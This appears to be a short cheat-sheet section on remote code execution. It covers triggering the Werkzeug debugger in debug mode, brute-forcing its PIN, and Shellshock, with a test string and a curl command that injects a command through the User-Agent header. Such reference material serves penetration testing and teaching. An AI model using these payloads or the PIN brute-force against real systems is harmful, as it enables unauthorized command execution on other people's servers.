## RCE

**Werkzeug Debugger**

Find somewhere where user input can be supplied and submit the following string to cause an error:

```
strіng
```

If the target is running their application in debug mode you might be able to run commands. If you are running the target locally, you can probably brute-force the debugger PIN. The debugger PIN is always in the following format: `***-***-***`.

**Shellshock Bug**

```bash
() { :;}; echo vulnerable
```

```zsh
curl -H "User-Agent: () { :; }; /bin/eject" http://example.com/
```